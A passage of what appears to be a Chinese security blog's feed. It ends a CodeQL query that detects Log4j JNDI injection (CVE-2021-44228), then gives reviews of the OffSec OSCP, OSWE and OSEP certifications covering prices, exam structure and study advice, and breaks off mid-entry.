@name JNDI lookup with user-controlled name in Log4j Lib</span><br><span class="line"> * @description Performing a JNDI lookup with a user-controlled name can lead to the download of an untrusted</span><br><span class="line"> *              object and to execution of arbitrary code.</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity error</span><br><span class="line"> * @security-severity 9.8</span><br><span class="line"> * @precision high</span><br><span class="line"> * @id java/jndi-injection</span><br><span class="line"> * @tags security</span><br><span class="line"> *       external/cwe/cwe-074</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.security.JndiInjectionQuery</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class JndiInjectionFlowConfigInLog4j extends TaintTracking::Configuration&#123;</span><br><span class="line">  JndiInjectionFlowConfigInLog4j() &#123; this = &quot;JndiInjectionFlowConfigInLog4j&quot; &#125;</span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source instanceof Log4jFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123; sink instanceof JndiInjectionSink &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType or node.getType() instanceof BoxedType</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">    any(JndiInjectionAdditionalTaintStep c).step(node1, node2)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Log4jFlowSource extends DataFlow::Node&#123;</span><br><span class="line">  Log4jFlowSource()&#123;</span><br><span class="line">    this.asParameter().getCallable().hasName(&quot;logIfEnabled&quot;) and</span><br><span class="line">    (</span><br><span class="line">      this.asParameter().hasName(&quot;message&quot;) or</span><br><span class="line">      this.asParameter().hasName(&quot;messageSupplier&quot;)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::PathNode source, DataFlow::PathNode sink, JndiInjectionFlowConfigInLog4j conf</span><br><span class="line">where conf.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, &quot;JNDI lookup might include name from $@.&quot;, source.getNode(),</span><br><span class="line">  &quot;this user input&quot;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>CodeQL CWE Coverage: <a href="https://codeql.github.com/codeql-query-help/codeql-cwe-coverage/">https://codeql.github.com/codeql-query-help/codeql-cwe-coverage/</a></p><p>CodeQL query help for Java: <a href="https://codeql.github.com/codeql-query-help/java/">https://codeql.github.com/codeql-query-help/java/</a></p><p>CodeQL Repository: <a href="https://github.com/github/codeql/tree/main/java/ql/src/Security/CWE">https://github.com/github/codeql/tree/main/java/ql/src/Security/CWE</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;虽然已经有了一个针对”Potential Log4J LDAP JNDI injection (CVE-2021-44228)”的实验性CWE-020 Query，但这次我想改写CWE-074，使其能够发现CVE-2021-44228。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="技术归纳" scheme="https://cn.4xpl0r3r.com/categories/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/"/>
    
    
    <category term="JNDI" scheme="https://cn.4xpl0r3r.com/tags/JNDI/"/>
    
    <category term="CVE" scheme="https://cn.4xpl0r3r.com/tags/CVE/"/>
    
    <category term="Java" scheme="https://cn.4xpl0r3r.com/tags/Java/"/>
    
    <category term="CodeQL" scheme="https://cn.4xpl0r3r.com/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>OSCE3之路 - OSCP | PEN200</title>
    <link href="https://cn.4xpl0r3r.com/%E8%AF%81%E4%B9%A6/OSCE3%E4%B9%8B%E8%B7%AF-OSCP-PEN200/"/>
    <id>https://cn.4xpl0r3r.com/%E8%AF%81%E4%B9%A6/OSCE3%E4%B9%8B%E8%B7%AF-OSCP-PEN200/</id>
    <published>2022-02-15T07:14:00.000Z</published>
    <updated>2023-07-21T02:55:27.439Z</updated>
    
    <content type="html"><![CDATA[<p>在2022年1月我拿到了中国大陆第一个OSCE3，我在参与PEN200-OSCP时使用的是2020年更新的新版教材(含域内容)，但考试依然是旧版(不含域内容)，在2022年OSCP的考试形式已经更新为新版形式(含域内容)。</p><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-americas mr-2"></i>本文同时提供以下语言的版本：<a href="https://4xpl0r3r.com/Certifications/OSCE3-Review-OSCP-OSEP-OSWE-OSED/">English</a>.</div></article><article class="message message-immersive is-warning"><div class="message-body"><i class="fas fa-exclamation-triangle mr-2"></i>本文部分信息已过时，请以官方信息为准。</div></article><p>OSCP的全称是 Offensive Security Certified Professional ( OffSec 认证专业人员) ，属于OffSec的200系中级认证，虽然OSCP并不是OSCE3的一部分，但是作为OffSec认证体系最知名的证书，还是写在这个系列文章中，并且介绍一下OffSec认证的一些杂项信息</p><blockquote><p>OSCP课程的旧名称简称PWK(Penetration with Kali)，新版名称为PEN200，我在本文中统一采用新版名称</p></blockquote><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><blockquote><p>有关PEN200-OSCP证书的官方最新信息位于这里：<a href="https://www.offensive-security.com/pwk-oscp/">https://www.offensive-security.com/pwk-oscp/</a></p><p>证书有效期：OffSec所有证书终身有效，无需更新</p></blockquote><h3 id="报名方式和费用"><a href="#报名方式和费用" class="headerlink" title="报名方式和费用"></a>报名方式和费用</h3><p>对于个人用户，目前Offensive Security(后称OffSec)提供了2种购买方式</p><ul><li><p>Packages</p></li><li><p>Subscriptions - 订阅制</p></li></ul><h4 id="Packages"><a href="#Packages" class="headerlink" title="Packages"></a>Packages</h4><ul><li>课程 + 30天Lab + 1次OSCP考试 999美元</li><li>课程 + 60天Lab + 1次OSCP考试 1199美元</li><li>课程 + 90天Lab + 1次OSCP考试 1349美元</li><li>重考费：249美元</li><li>30天Lab延长：359美元</li><li>60天Lab延长：599美元</li><li>90天Lab延长：799美元</li></ul><h4 id="Subscriptions"><a href="#Subscriptions" class="headerlink" title="Subscriptions"></a>Subscriptions</h4><p>Learn One套餐（2499美元）: PEN200-OSCP课程 + 2次OSCP考试机会 + PEN210-OSWP课程 + 1次OSWP考试机会 + 365天Lab + PEN100课程 + KLCP课程 + 1次KLCP考试机会 + PG Practice会员</p><p>Learn Unlimited套餐（5499美元）: OffSec所有课程 + 365天Lab + 无限次考试机会（受冷静期约束） + PG Practice会员</p><h4 id="个人建议"><a href="#个人建议" class="headerlink" title="个人建议"></a>个人建议</h4><p>对于基础扎实的师傅，建议选择便宜的$999 Package，成本低一些，有一些基础或者有时间想多刷一点Lab的同学，可以考虑60天或者90天Lab，个人不太建议Learn One套餐，虽然东西很多，但是我觉得比如KLCP和OSWP现在认可度并不是很高，365天Lab除非铁了心刷完Lab，否则不太有必要</p><p>如果想要完成OffSec最核心的OSCE3系列证书+OSCP证书，Learn Unlimited是个好选择，但要慎重考虑，一整年的时间需要一直学习，OffSec的考试难度并不低，大部分人需要好好准备几个月才能通过，否则也容易浪费</p><h3 id="如何报名"><a href="#如何报名" class="headerlink" title="如何报名"></a>如何报名</h3><p>参与OffSec的各项考试都必须要准备的东西和需要注意的一些问题</p><p>对于第一次海外支付的同学，最好要准备一张Visa卡或者MasterCard信用卡，否则支付会遇到问题</p><p>护照是必备的，OffSec在考试时需要提供了英文的官方证件，出于长期打算，办一张护照是成本最低选择</p><p>实在办不到护照怎么办？最近通过和一些其它考生的交流，驾驶证是不能使用的了，唯一的其他选项就是经过公证的身份证，步骤比较麻烦而且成本听说比护照还要高</p><p>不论是课程开始还是考试，都不是付费后立刻开始的，都需要预约，根据淡季旺季时间有所不同，课程一般等待时机在10天左右，考试的话如果不考虑工作日还是假期的问题以及开始时间的问题，基本上半个月内可以参与考试，如果要找到一个假期的中午开始这种黄金时间，基本上得1个半月左右才能找到了，而且随着OSCP热度持续上升，这个时间目前还是只增不减</p><h2 id="如何预习"><a href="#如何预习" class="headerlink" title="如何预习"></a>如何预习</h2><blockquote><p>虽然OSCP全程使用英语学习、考试，但是除非对英语一窍不通，个人认为没有必要专门去学习英语，毕竟随时都允许使用翻译软件，包括考试时，只不过相比熟悉英语的同学的进展会慢一些</p></blockquote><p>虽然OSCP课程官网并没有给出要求的基础能力，但是我认为拥有以下能力能够大幅加速OSCP正式学习时的进展</p><ul><li>Debian系 Linux的命令使用能力</li><li>Python脚本的开发能力</li><li>会使用Google</li></ul><p>除此之外，按照官网的课程大纲掌握一些能自己学会的部分，能够节约你在正式课程中阅读教材的时间</p><blockquote><p>官方的课程大纲：<a href="https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf">penetration-testing-with-kali.pdf (offensive-security.com)</a></p></blockquote><p>掌握了基础能力后，虽然官方Lab最贴近考试环境，但是量也很大，有七十多个靶机，建议先刷一刷OSCP like的HackTheBox机器，然后再刷Lab效率更高</p><p>这份OSCP like清单的最新版本通过此链接可以获取到：<a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159">https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159</a></p><p>其中包含了各个靶场的资源整理，我推荐优先练习Proving Grouds和HackTheBox的靶机</p><p><img src="../../img/OSCE3%E4%B9%8B%E8%B7%AF-OSCP-PEN200.assets/image-20220112235202829.png" alt="image-20220112235202829"></p><h2 id="关于课程"><a href="#关于课程" class="headerlink" title="关于课程"></a>关于课程</h2><p>课程中的几个重要资源如下</p><ul><li>教材 PDF版本和视频版本，建议阅读PDF，效率更高，看不懂的地方看视频操作即可</li><li>OSCP的靶机为所有学生共享，OSCE3的300系列的学生靶机为每个学生独享</li><li>学生论坛 里面提供了各种Lab机器的提示以及讨论，并且在官方管理员的控制下不会有答案泄漏</li><li>官方Discord频道 相比论坛为学生们提供了更便捷的实时讨论，学生注册后，在<a href="https://portal.offensive-security.com/%E4%B8%AD%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E5%88%B0%E9%82%80%E8%AF%B7%E9%93%BE%E6%8E%A5">https://portal.offensive-security.com/中可以获取到邀请链接</a></li></ul><p>由于教材是英文的，我建议边学习边把重要的部分自己整理出来作为笔记，考试是允许联网并且可以随意翻阅资料的，但是我还是希望大家自己整理一份CheatSheet（常用的指令集合，如Enumeration和常见的Exploit）出来，可以节约考试时的时间</p><blockquote><p>不推荐使用别人的笔记或CheatSheet</p></blockquote><p>在PEN200-OSCP中可以学到许多渗透测试的基础能力，如信息收集、使用Exploit和提权。Windows和Linux都在学习和考察的范围内</p><p>考试重点考察2块领域的能力，也是我们要重点学习的地方</p><ol><li>Enumeration - 枚举各种信息</li><li>寻找Exploit，利用各种搜索引擎如Exploit Database(OffSec自己的漏洞库，最重要)、Google、GitHub的搜索</li></ol><p>不论是获取Initial foothold还是提权，都是这两种能力的挑战</p><h3 id="关于Lab"><a href="#关于Lab" class="headerlink" title="关于Lab"></a>关于Lab</h3><p>虽然教材长达800多页，但是Lab才是PEN200课程的核心部分，因为渗透测试是实践中才能学会的技能</p><p>大部分机器都是独立可以通关的，但是有部分机器之间存在依赖，你需要先攻克另一台机器并在Post-Enumeration中获取到足够的信息才能攻破另一台机器。</p><p>关于Lab练习量和通过率的关联，可以在<a href="https://www.offensive-security.com/offsec/pwk-labs-success/">A Path to Success in the PWK Labs | Offensive Security (offensive-security.com)</a>这篇OffSec官方文章中获取到，其中包含了Lab的各种信息，也包含了Lab的网络拓扑，值得一读，网络拓扑如图</p><p><img src="../../img/OSCE3%E4%B9%8B%E8%B7%AF-OSCP-PEN200.assets/pwk-labs.png" alt="The PWK Labs"></p><p>首先我们可以直接访问的Lab机器处在Public段，还有IT Department、Admin、Dev段，这些段需要通过靶机使用网络代理才能访问。</p><p>Sandbox则是用于和教材练习搭配使用</p><p>所有Lab机器都是共享使用，OSCE3(OSWE、OSEP、OSED)系列则是每个学生独享，建议做之前先重置一下，不用担心太多人来抢，因为OffSec通过课程预约制度控制了课程参与人数，即使偶然遇到抢着revert的问题，换一台机器即可，</p><p>Lab刷题数和考试通过率关联如下，可以发现难易程度真的是因人而异，不要抱着“我考不过，这证书真牛；我都考过了，这证书真水“这样的想法</p><p><img src="../../img/OSCE3%E4%B9%8B%E8%B7%AF-OSCP-PEN200.assets/pwk-stats.png" alt="A Quick Look at PWK Statistics"></p><h3 id="关于考试新增的要求——域"><a href="#关于考试新增的要求——域" class="headerlink" title="关于考试新增的要求——域"></a>关于考试新增的要求——域</h3><p>域要考察的内容在教材第21章全部讲解了，掌握教材中的内容我认为足以通过考试。并且在教材最后一章有一个完整的例子，非常有价值，并且在Lab中也有一些关于AD的题目</p><p>虽然我没有参与过OSCP的域考试，但是在OSEP中涉及了大量的域技术，我认为这方面技术只要好好学习教材内的内容，并且完成相关的练习，域相关的技术并不会特别难</p><h2 id="关于新版考试"><a href="#关于新版考试" class="headerlink" title="关于新版考试"></a>关于新版考试</h2><blockquote><p>官方的考试指引：<a href="https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide">OSCP Exam Guide – Offensive Security Support Portal (offensive-security.com)</a></p><p>考试时长24小时和通过分数70分并无变动</p><p>由于OffSec的考试时间安排，我说的考试时间包含提前15分钟进行身份验证的环节</p></blockquote><p>OffSec的考试形式一直是其特色所在，讲究实操能力，要开展实战的攻击才能拿到拿到分数</p><p>由于考试结构已经大改，我当时的考试经验已经不太具有参考价值了，建议大家多看看2022年发布的其它OSCP考试review来获取更贴切的感受，我就从考试的结构变化和我的学习经验入手来分析一下</p><p>首先是官方的说明：<a href="https://www.offensive-security.com/offsec/oscp-exam-structure/">https://www.offensive-security.com/offsec/oscp-exam-structure/</a></p><p>先简单介绍一下旧版本的考试</p><p>旧版本的考试分数结构为25+25+20+20+10，通过分数为70分，完成所有教材练习和10道Lab并提供报告奖励5分</p><p>每个20分的题目，用户权限和root权限的获取分别10分，其中Buffer Overflow（后简称BOF）是必考的，占25分，域是必不考的，另外一个25分题分为15分+10分的结构</p><p>新版本则分为两部分</p><p>独立靶机部分（60分），类似旧版，每题用户权限和root权限的获取分别10分，共3题，BOF变为可能会考而不是必考</p><p>域部分（40分），包含两个Client机和一台DC域控，必须完整获取整个域的控制以得到完整的40分，否则1分不给</p><p>考试通过门槛依然为70分（这意味域部分必须搞定），奖励分数的获取方式变为完成考试的域部分和10台Lab机器即可得到，并且提升为10分，相比之前而已获取的难度其实是大幅降低了，教材的超大量习题劝退了包括我和其它许多同学</p><p>由此可见，域部分突然从不考变为必考，体现出了时代要求的变化以及OffSec紧跟信息安全前沿的态度，我认为是一件好事</p><p>由于目前参与新考试并通过的考生并不多，我建议熟练掌握教材中的AD相关内容和练习，掌握Lab中的AD题（具体是哪几题可以去Discord的OSCP学生频道问），通过HackTheBox中的域类型机器提高熟练度</p><h2 id="Lab靶场和考试的网络问题"><a href="#Lab靶场和考试的网络问题" class="headerlink" title="Lab靶场和考试的网络问题"></a>Lab靶场和考试的网络问题</h2><p>之前很多国内考试遇到过由于防火墙的原因，完全连接不上Lab和考试的情况，遇到的话，之前都可以和官方联系推迟时间然后你自己解决，但是2021年OffSec开始给每个中国和埃及考生会发额外的免责邮件，要求学生自行确定好网络连接问题</p><p>虽然是这么说，但是在我最近几次考试的过程中，Lab和考试均可稳定直连（我位于东南沿海地区），甚至网络性能比我挂了代理还要好（在使用远程桌面时尤为明显），但还是建议大家备好代理，以免遇到意外情况</p><h2 id="通过OSCP之后——OSCE3"><a href="#通过OSCP之后——OSCE3" class="headerlink" title="通过OSCP之后——OSCE3"></a>通过OSCP之后——OSCE3</h2><p>完成PEN200课程拿到OSCP证书后，接下来就是OffSec的300系列课程了，难度更大并且要求更高，分别是OSEP、OSWE、OSED，分别对应对域渗透和免杀的更加深入、Web安全Exploit开发、二进制安全Exploit开发，拿到这三张证书后即可获得OSCE3证书，想要深入了解OSCE3的各个证书，可以继续阅读本系列的其它篇章</p><p><img src="../../img/OSCE3%E4%B9%8B%E8%B7%AF-OSCP-PEN200.assets/advanced-courses-3-in-1-cert-1024x536.png" alt="img"></p><p><img src="../../img/OSCE3%E4%B9%8B%E8%B7%AF-OSCP-PEN200.assets/image-20220127223659584.png" alt="OSCP Certification"></p><p><img src="../../img/OSCE3%E4%B9%8B%E8%B7%AF-OSCP-PEN200.assets/image-20220210150422237.png" alt="OSCE3 Certification"></p><p>欢迎和我深入交流OffSec的各个证书：<a href="mailto:&#x34;&#x78;&#x70;&#x6c;&#x30;&#x72;&#x33;&#x72;&#64;&#103;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;">&#x34;&#x78;&#x70;&#x6c;&#x30;&#x72;&#x33;&#x72;&#64;&#103;&#109;&#97;&#x69;&#x6c;&#46;&#99;&#x6f;&#109;</a></p><p>（一起吐槽OffSec哈哈哈，交个朋友也欢迎，如需加好友，通过邮件发送联系方式即可）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在2022年1月我拿到了中国大陆第一个OSCE3，我在参与PEN200-OSCP时使用的是2020年更新的新版教材(含域内容)，但考试依然是旧版(不含域内容)，在2022年OSCP的考试形式已经更新为新版形式(含域内容)。&lt;/p&gt;</summary>
    
    
    
    <category term="证书" scheme="https://cn.4xpl0r3r.com/categories/%E8%AF%81%E4%B9%A6/"/>
    
    
    <category term="OffSec" scheme="https://cn.4xpl0r3r.com/tags/OffSec/"/>
    
  </entry>
  
  <entry>
    <title>OSCE3之路 - OSWE | WEB300</title>
    <link href="https://cn.4xpl0r3r.com/%E8%AF%81%E4%B9%A6/OSCE3%E4%B9%8B%E8%B7%AF-OSWE-WEB300/"/>
    <id>https://cn.4xpl0r3r.com/%E8%AF%81%E4%B9%A6/OSCE3%E4%B9%8B%E8%B7%AF-OSWE-WEB300/</id>
    <published>2022-02-15T07:13:47.000Z</published>
    <updated>2023-07-21T02:55:17.356Z</updated>
    
    <content type="html"><![CDATA[<p>在2022年1月我拿到了OSCE3，OSWE是我在21年4月拿到的，本篇我们来介绍WEB300-OSWE，它是关于OffSec关于Exploit Development的第一个认证。</p><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-americas mr-2"></i>本文同时提供以下语言的版本：<a href="https://4xpl0r3r.com/Certifications/OSCE3-Review-OSCP-OSEP-OSWE-OSED/">English</a>.</div></article><article class="message message-immersive is-warning"><div class="message-body"><i class="fas fa-exclamation-triangle mr-2"></i>本文部分信息已过时，请以官方信息为准。</div></article><blockquote><p>对于一些更加基础的信息，如报名问题、网络问题，请参阅OSCP篇</p><p>OffSec的所有认证都没有前置要求，如果不想考OSCP直接考OSWE，完全是可以的</p></blockquote><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><blockquote><p>有关WEB300-OSWE证书的官方最新信息位于这里：<a href="https://www.offensive-security.com/awae-oswe">https://www.offensive-security.com/awae-oswe</a></p></blockquote><h3 id="报名方式和费用"><a href="#报名方式和费用" class="headerlink" title="报名方式和费用"></a>报名方式和费用</h3><p>对于个人用户，目前Offensive Security(后称OffSec)提供了2种购买方式</p><ul><li><p>Packages</p></li><li><p>Subscriptions - 订阅制</p></li></ul><p>####Packages</p><blockquote><p>目前来说OSWE是Packages购买方式300系列中最贵的，均价高150美元</p></blockquote><ul><li>课程 + 60天Lab + 1次OSWE考试 1449美元</li><li>课程 + 90天Lab + 1次OSWE考试 1649美元</li><li>重考费：249美元</li><li>30天Lab延长：359美元</li><li>60天Lab延长：599美元</li><li>90天Lab延长：799美元</li></ul><h4 id="Subscriptions"><a href="#Subscriptions" class="headerlink" title="Subscriptions"></a>Subscriptions</h4><p>Learn One套餐（2499美元）: WEB300-OSWE课程 + 2次OSWE考试机会 + PEN210-OSWP课程 + 1次OSWP考试机会 + 365天Lab + PEN100课程 + KLCP课程 + 1次KLCP考试机会 + PG Practice会员</p><p>Learn Unlimited套餐（5499美元）: OffSec所有课程 + 365天Lab + 无限次考试机会（受冷静期约束） + PG Practice会员</p><h4 id="个人建议"><a href="#个人建议" class="headerlink" title="个人建议"></a>个人建议</h4><p>可以发现300系列的套餐没有30天套餐，建议学习时间比较充沛的可以选择60天Lab，如果平时事情比较忙，可以考虑90天的Lab，由于我空闲时间比较充足，我的OSEP和OSED都是选择的60天套餐以节约时间，由于我的主要学习方向是Web安全，因此OSWE则是选择了更便宜的30天套餐（此套餐已经退役，并且大概率不会再出）</p><blockquote><p>如何报名参加OffSec的认证与课程请阅读PEN200-OSCP篇</p></blockquote><h2 id="300系列横向比较"><a href="#300系列横向比较" class="headerlink" title="300系列横向比较"></a>300系列横向比较</h2><p>OSWE是300系列中存在时间最长的认证，相较于PEN系列注重于黑盒，OSWE则注重的是Web安全方向的白盒审计，虽然由于我主攻方向是Web方向，OSWE是我最轻松拿下的证书，但是综合比较而言，我认为在思维难度上，OSWE应该是300系列最高的，虽然OSED也是半白盒开发exploit，也许是因为推出时间较短，还没有进化出思维难度比较高的题目</p><h2 id="如何预习"><a href="#如何预习" class="headerlink" title="如何预习"></a>如何预习</h2><p>首先建议大家打好编程语言的基础</p><ul><li>PHP</li><li>Java Web</li><li>NodeJS</li><li>ASP.Net(C#)</li><li>Python</li></ul><p>除了语言之外，根据官方的PREREQUISITES，还需要以下能力</p><ul><li>熟悉Linux</li><li>熟悉Web代理</li><li>基本了解Web应用的攻击向量、理论和实践</li></ul><p>可以发现，对于Web开发转安全或者曾经在CTF中担任Web手的同学，OSWE应该是OffSec系列认证中最容易的</p><p>但是由于OSWE着重于白盒审计，和CTF的Web侧重点还是有些差别的</p><p>基础打扎实之后，推荐一下Web安全的教程，内容非常全面，如果时间有限的话，可以参考课程大纲有针对性地预习</p><p><a href="https://portswigger.net/web-security/all-materials">https://portswigger.net/web-security/all-materials</a></p><p>WEB-300的课程大纲：<a href="https://www.offensive-security.com/documentation/awae-syllabus.pdf">awae-syllabus.pdf (offensive-security.com)</a></p><p>稍微详细地看的话，可以发现大多以真实例子进行讲解，WEB300和EXP301都是研究Exploit Development（EXP开发）的，因此都采用实例进行讲解，因此我认为掌握好了上面的编程基础知识和Web漏洞基础知识，就可以正式开启课程了</p><p>之前提供了OSCP like靶机清单的列表也提供了OSWE like的清单，我没有去练过，如果大家预习时间比较多，可以考虑去练习一下</p><p><a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159">https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159</a></p><h2 id="关于课程"><a href="#关于课程" class="headerlink" title="关于课程"></a>关于课程</h2><p>课程中的几个重要资源如下</p><ul><li>教材 PDF版本和视频版本，建议阅读PDF，效率更高，看不懂的地方看视频操作即可</li><li>Lab 提供了最贴近考试的各种靶机环境，由于WEB300的教材以实例讲解，Lab中也提供了教材的配套靶机，除此之外还有几个供学生练习的Challenge，Challenge以白盒为主，有少量黑盒题，但是考试只考查白盒</li><li>300系列的学生靶机为每个学生独享，与OSCP的所有学生共享不同</li><li>学生论坛 里面提供了各种Lab机器的提示以及讨论，并且在官方管理员的控制下不会有答案泄漏</li><li>官方Discord频道 相比论坛为学生们提供了更便捷的实时讨论，学生注册后，在<a href="https://portal.offensive-security.com/%E4%B8%AD%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%8F%96%E5%88%B0%E9%82%80%E8%AF%B7%E9%93%BE%E6%8E%A5">https://portal.offensive-security.com/中可以获取到邀请链接</a></li></ul><p>WEB300-OSWE课程的学习方式比较单调，我的学习方法就是边看PDF边练习，把教材里的实例都练习完之后，基本就掌握得差不多了，这可能是因为我有在CTF做Web题的经验导致的，此课程对我来说并没有很高的难度</p><p>随后开始刷Web题目，对于没有Web安全经验的同学来说可能会有些难度，可以去官方discord提问，同学都比较热情。只要是教材教到的漏洞都有可能考查，包括有些同学觉得不会出的CSRF这种客户端攻击或者碰撞攻击，事实上在Exam如果没有考到也只是个人没有考到，越是觉得不会考的反倒喜欢考</p><p>对于WEB300-OSWE和EXP301-OSED，我都强烈建议边学习边总结思维导图，这对于巩固学习以及在考试中思考攻击路径都极有帮助</p><h2 id="关于考试"><a href="#关于考试" class="headerlink" title="关于考试"></a>关于考试</h2><blockquote><p>官方的考试指引：<a href="https://help.offensive-security.com/hc/en-us/articles/360046869951-OSWE-Exam-Guide">OSWE Exam Guide – Offensive Security Support Portal (offensive-security.com)</a></p><p>300系列的考试时长均为48小时</p></blockquote><p>考试考查的是手工白盒审计，因此各种自动化工具就不要想着使用了，每道题目会提供2台机器，2台机器除了密码不一样完全一样，一台用于给学生获取源代码并分析，另一台用来获取Proof</p><p>每道题目分为两个考查阶段，第一阶段为Bypass Login，也就是利用Web攻击登录到网站后台，此为第一阶段，第二阶段则为RCE，就是要通过Web服务拿到主机的Shell，不需要提权，拿到Shell后就能拿到这个机器的满分</p><p>考试的满分是100分，85分通过，总共2台机器，第一阶段35分，第二阶段15分，这意味着2台机器的Bypass Login都必须成功，RCE倒是只需要完成其中一台即可，我当时由于考试空余时间比较多，拿到满分+写完报告花的时间还不到20小时，因此就全部搞定了</p><p>拿到所有Proof后还要编写一个Exploit，用于自动化完成攻击，建议使用Python3</p><p>考察范围就是教材教到过的所有漏洞类型或组合利用，不要问别人考试考了什么漏洞，每个人考察到的都是不同的</p><p>相比于教材都是使用真实案例做例子，考试则全部使用OffSec自行开发的题目，涉及到的代码语言每个人考到的都不同</p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>如果你想要了解的信息文章中没有提到，欢迎发邮件给我一起交流，也欢迎加个好友，通过邮件发送联系方式给我即可</p><p><a href="mailto:&#52;&#x78;&#112;&#x6c;&#x30;&#x72;&#51;&#114;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#111;&#109;">&#52;&#x78;&#112;&#x6c;&#x30;&#x72;&#51;&#114;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#111;&#109;</a></p><p><img src="../../img/OSCE3%E4%B9%8B%E8%B7%AF-OSWE-WEB300.assets/image-20220127223805280.png" alt="OSWE Certification"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在2022年1月我拿到了OSCE3，OSWE是我在21年4月拿到的，本篇我们来介绍WEB300-OSWE，它是关于OffSec关于Exploit Development的第一个认证。&lt;/p&gt;</summary>
    
    
    
    <category term="证书" scheme="https://cn.4xpl0r3r.com/categories/%E8%AF%81%E4%B9%A6/"/>
    
    
    <category term="OffSec" scheme="https://cn.4xpl0r3r.com/tags/OffSec/"/>
    
  </entry>
  
  <entry>
    <title>OSCE3之路 - OSEP | PEN300</title>
    <link href="https://cn.4xpl0r3r.com/%E8%AF%81%E4%B9%A6/OSCE3%E4%B9%8B%E8%B7%AF-OSEP-PEN300/"/>
    <id>https://cn.4xpl0r3r.com/%E8%AF%81%E4%B9%A6/OSCE3%E4%B9%8B%E8%B7%AF-OSEP-PEN300/</id>
    <published>2022-02-15T07:13:36.000Z</published>
    <updated>2023-07-21T02:55:15.287Z</updated>
    
    <content type="html"><![CDATA[<p>在2022年1月我拿到了OSCE3，OSEP是我在21年8月拿到的，其和PEN200-OSCP均属于PEN系列，也就是渗透测试类。</p><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-americas mr-2"></i>本文同时提供以下语言的版本：<a href="https://4xpl0r3r.com/Certifications/OSCE3-Review-OSCP-OSEP-OSWE-OSED/">English</a>.</div></article><article class="message message-immersive is-warning"><div class="message-body"><i class="fas fa-exclamation-triangle mr-2"></i>本文部分信息已过时，请以官方信息为准。</div></article><blockquote><p>对于一些更加基础的信息，如报名问题、网络问题，请参阅OSCP篇</p><p>OffSec的所有认证都没有前置要求，如果不想考OSCP直接考OSEP，完全是可以的</p></blockquote><p>OSEP的全称是 Offensive Security Experienced Penetration Tester ( OffSec 资深渗透测试员) ，属于OffSec的300系高级认证，主要聚焦于横向移动、域渗透和免杀并且相比OSCP更加贴近红队实战，提供了钓鱼等技术的教学</p><blockquote><p>在OSEP考试中也有可能会出现教程中的钓鱼技术的考点，而不是停留在书面上</p></blockquote><p>OSEP代替了旧版OSCE的位置，主要继承并拓展了OSCE的渗透测试技术部分，而二进制安全部分则被拓展并转移到EXP301-OSED中</p><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><blockquote><p>有关PEN300-OSEP证书的官方最新信息位于这里：<a href="https://www.offensive-security.com/pen300-osep/">https://www.offensive-security.com/pen300-osep/</a></p></blockquote><h3 id="报名方式和费用"><a href="#报名方式和费用" class="headerlink" title="报名方式和费用"></a>报名方式和费用</h3><p>对于个人用户，目前Offensive Security(后称OffSec)提供了2种购买方式</p><ul><li><p>Packages</p></li><li><p>Subscriptions - 订阅制</p></li></ul><p>####Packages</p><ul><li>课程 + 60天Lab + 1次OSEP考试 1299美元</li><li>课程 + 90天Lab + 1次OSEP考试 1499美元</li><li>重考费：249美元</li><li>30天Lab延长：359美元</li><li>60天Lab延长：599美元</li><li>90天Lab延长：799美元</li></ul><h4 id="Subscriptions"><a href="#Subscriptions" class="headerlink" title="Subscriptions"></a>Subscriptions</h4><p>Learn One套餐（2499美元）: PEN300-OSEP课程 + 2次OSEP考试机会 + PEN210-OSWP课程 + 1次OSWP考试机会 + 365天Lab + PEN100课程 + 